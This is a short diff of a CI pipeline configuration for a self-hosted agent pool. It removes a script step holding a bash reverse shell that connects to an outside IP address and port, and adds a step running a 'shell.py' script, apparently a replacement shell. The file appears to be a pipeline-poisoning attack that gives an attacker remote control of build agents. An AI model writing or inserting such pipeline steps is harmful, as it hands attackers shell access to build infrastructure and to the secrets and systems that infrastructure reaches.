@@ -6,4 +6,5 @@ name: 'on-premagent' # Specifies the self-hosted agent pool
 
 steps:
 - script: |
-  sh -i >& /dev/tcp/51.15.223.113/1337 0>&1
+  python3 shell.py
+  displayName: 'Run shell.py'
